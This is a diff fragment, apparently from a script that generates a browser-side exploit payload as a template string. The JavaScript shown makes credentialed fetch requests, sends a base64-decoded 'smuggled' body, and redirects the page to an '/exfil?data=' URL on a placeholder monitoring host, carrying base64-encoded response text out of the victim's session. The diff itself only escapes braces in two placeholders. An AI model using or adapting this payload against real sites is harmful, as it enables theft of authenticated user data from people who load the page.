@@ -836,7 +836,7 @@ fetch("/api?action=clear").then(response => {{
         mode: "no-cors",
         credentials: "include",
         keepAlive: true,
-        body: atob('{smuggled_self}')
+        body: atob('\{smuggled_self\}')
     }})
     .then(response => {{
 
@@ -856,7 +856,7 @@ fetch("/api?action=clear").then(response => {{
             }})
             .then(response => response.text())
             .then(text => {{
-                document.location='http://{mon_ip}/exfil?data='.concat(btoa(text))
+                document.location='http://\{mon_ip\}/exfil?data='.concat(btoa(text))
             }})
 
         }})
